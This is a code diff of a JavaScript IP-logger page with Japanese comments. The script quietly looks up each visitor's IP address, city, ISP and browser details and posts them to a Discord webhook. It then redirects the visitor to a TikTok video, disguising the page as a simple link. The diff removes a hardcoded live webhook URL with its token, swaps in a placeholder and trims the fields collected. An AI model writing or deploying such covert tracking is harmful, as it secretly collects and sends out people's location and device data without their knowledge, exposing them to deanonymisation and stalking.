@@ -1,55 +1,50 @@
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1496426741068202024/_p47MrXmw96zzzlw_-eN15stpsWHCptYKK3byQCoUofsD-AllITmfui1Q4b0sUaRO5zU"; // ここにWebhook URLを貼る
+const WEBHOOK_URL = "ここにあなたのWebhookURL"; 
 const REDIRECT_URL = "https://www.tiktok.com/@sakonji_jrfv/video/7625181468586790162?is_from_webapp=1&sender_device=pc&web_id=7621142624386418184";
 
 async function track() {
     try {
-        // 1. IPと詳細な場所情報を取得
+        console.log("情報取得中...");
         const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
         
-        // 2. ブラウザから取得できる詳細情報
         const details = {
             os: navigator.platform,
             browser: navigator.userAgent,
-            language: navigator.language,
             screenSize: `${window.screen.width}x${window.screen.height}`,
             referrer: document.referrer || "直接アクセス",
             localTime: new Date().toLocaleString('ja-JP')
         };
 
-        // 3. Discordに送信
         if (WEBHOOK_URL) {
+            console.log("Discordに送信中...");
+            // 【重要】await を使って、送信が終わるまで「待機」させます
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
-                        title: "📊 詳細アクセスログ",
+                        title: "📊 アクセス検出成功",
                         color: 15418782,
                         fields: [
-                            { name: "🌐 IPアドレス", value: data.ip || "取得失敗", inline: true },
+                            { name: "🌐 IP", value: data.ip || "取得失敗", inline: true },
                             { name: "📍 場所", value: `${data.country_name} / ${data.city}`, inline: true },
-                            { name: "🏢 プロバイダ", value: data.org || "取得失敗" },
-                            { name: "📱 デバイス/OS", value: details.os, inline: true },
-                            { name: "🖥️ 画面解像度", value: details.screenSize, inline: true },
-                            { name: "🌍 ブラウザ言語", value: details.language, inline: true },
-                            { name: "🔗 参照元", value: details.referrer },
-                            { name: "🕒 現地時刻", value: details.localTime },
-                            { name: "ℹ️ ブラウザ詳細", value: `\`\`\`${details.browser}\`\`\`` }
-                        ],
-                        timestamp: new Date().toISOString()
+                            { name: "📱 OS", value: details.os, inline: true },
+                            { name: "🕒 時刻", value: details.localTime, inline: true }
+                        ]
                     }]
                 })
             });
+            console.log("送信完了！");
         }
     } catch (e) {
-        console.error("Tracking error:", e);
+        console.error("エラー:", e);
     }
 
-    // 1.5秒後にTikTokへリダイレクト
+    // 送信が終わってから2秒後にリダイレクト
+    console.log("TikTokへ移動します...");
     setTimeout(() => {
         window.location.href = REDIRECT_URL;
-    }, 1500);
+    }, 2000);
 }
 
 track();
